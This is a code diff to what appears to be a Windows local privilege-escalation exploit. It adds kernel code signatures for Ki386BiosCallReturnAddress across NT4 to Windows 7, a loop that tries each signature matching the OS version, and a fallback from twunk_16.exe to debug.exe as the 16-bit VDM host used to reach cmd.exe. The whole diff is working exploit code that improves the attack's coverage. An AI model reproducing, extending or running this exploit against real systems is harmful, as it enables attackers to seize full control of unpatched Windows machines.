@@ -52,6 +52,12 @@
 //
 
 
+// Windows 2000 fails to find the VDM_TIB size (something else is wrong)
+// Windows 2008 Storage Server has 16-bit applications disabled by default
+// Windows 2008 Storage Server is also missing twunk_16.exe, has debug.exe
+
+
+
 #ifndef WIN32_NO_STATUS
 # define WIN32_NO_STATUS // I prefer the definitions from ntstatus.h
 #endif
@@ -92,15 +98,23 @@ typedef struct {
 	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
 } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
 
+typedef struct CodeSignature {
+	UCHAR Signature[16];
+	DWORD Version;
+};
+
+
 // These are generated using kd -kl -c 'db nt!Ki386BiosCallReturnAddress;q'
-static CONST UCHAR CodeSignatures[][16] = {
-	{ "\x64\xA1\x1C\x00\x00\x00\x5A\x89\x50\x04\x8B\x88\x24\x01\x00\x00" }, // Windows NT4
-	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84" }, // Windows 2000
-	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84" }, // Windows XP
-	{ "\xA1\x1C\xF0\xDF\xFF\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00\x00" }, // Windows 2003
-	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00" }, // Windows Vista
-	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00" }, // Windows 2008
-	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00" }, // Windows 7
+struct CodeSignature CodeSignatures[] = {
+	{ "\x64\xA1\x1C\x00\x00\x00\x5A\x89\x50\x04\x8B\x88\x24\x01\x00\x00", 0 }, // Windows NT4
+	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84", 1 }, // Windows 2000
+	{ "\x64\xA1\x1C\x00\x00\x00\x5F\x8B\x70\x04\xB9\x84\x00\x00\x00\x89", 1 }, // Windows 2000 SP4 Advanced Server
+	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84", 2 }, // Windows XP
+	{ "\xA1\x1C\xF0\xDF\xFF\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00\x00", 3 }, // Windows 2003
+	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00", 4 }, // Windows Vista
+	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00", 5 }, // Windows 2008
+	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00", 6 }, // Windows 7
+	{ "", -1 }
 };
 
 // Log levels.
@@ -136,10 +150,20 @@ int main(int argc, char **argv)
 		"\n"
 		);
 
-	GetWindowsDirectory(VDMPath, 1024);
+	GetWindowsDirectory(VDMPath, _MAX_PATH);
 	_tcscat_s(VDMPath, _MAX_PATH, _T("\\twunk_16.exe"));
 
-	GetSystemDirectory(CMDPath, 1024);
+	if (GetFileAttributes(VDMPath) == INVALID_FILE_ATTRIBUTES) {
+		GetSystemDirectory(VDMPath, _MAX_PATH);
+		_tcscat_s(VDMPath, _MAX_PATH, _T("\\debug.exe"));
+
+		if (GetFileAttributes(VDMPath) == INVALID_FILE_ATTRIBUTES) {
+			LogMessage(L_INFO, "Could not find twunk_16.exe or debug.exe");
+			return(0);
+		}
+	}
+
+	GetSystemDirectory(CMDPath, _MAX_PATH);
 	_tcscat_s(CMDPath, _MAX_PATH, _T("\\cmd.exe"));
 
 	if(! ShellPid) {
@@ -364,7 +388,7 @@ BOOL ScanForCodeSignature(PDWORD KernelBase, PDWORD OffsetFromBase)
 	OSVERSIONINFO osvi = { sizeof osvi };
 	PBYTE ImageBase;
 	DWORD PhysicalAddressExtensions, DataSize;
-	ULONG i;
+	ULONG i,x;
 	HKEY MmHandle;
 	SYSTEM_MODULE_INFORMATION ModuleInfo = {0};
 
@@ -422,20 +446,31 @@ BOOL ScanForCodeSignature(PDWORD KernelBase, PDWORD OffsetFromBase)
 	PeHeader                    = (PIMAGE_NT_HEADERS)(ImageBase + DosHeader->e_lfanew);
 	OptHeader                   = &PeHeader->OptionalHeader;
 
-	LogMessage(L_DEBUG, "Searching for kernel %u.%u signature { %02hhx, %02hhx, ... } ...",
+	LogMessage(L_DEBUG, "Searching for kernel %u.%u signature: version %d...",
 		osvi.dwMajorVersion,
 		osvi.dwMinorVersion,
-		CodeSignatures[Version][0],
-		CodeSignatures[Version][1]);
+		Version
+	);
 
-	// Scan for the appropriate signature
-	for (i = OptHeader->BaseOfCode; i < OptHeader->SizeOfCode; i++) {
-		if (memcmp(&ImageBase[i], CodeSignatures[Version], sizeof CodeSignatures[Version]) == 0) {
-			LogMessage(L_INFO, "Signature found %#x bytes from kernel base", i);
+	for (x=0;;x++) {
 
-			*OffsetFromBase = i;
-			FreeLibrary(KernelHandle);
-			return TRUE;
+		if(CodeSignatures[x].Version == -1)
+			break;
+
+		if(CodeSignatures[x].Version != Version)
+			continue;
+
+		LogMessage(L_INFO, "Trying signature with index %d", x);
+
+		// Scan for the appropriate signature
+		for (i = OptHeader->BaseOfCode; i < OptHeader->SizeOfCode; i++) {
+			if (memcmp(&ImageBase[i], CodeSignatures[x].Signature, sizeof CodeSignatures[x].Signature) == 0) {
+				LogMessage(L_INFO, "Signature found %#x bytes from kernel base", i);
+
+				*OffsetFromBase = i;
+				FreeLibrary(KernelHandle);
+				return TRUE;
+			}
 		}
 	}
 
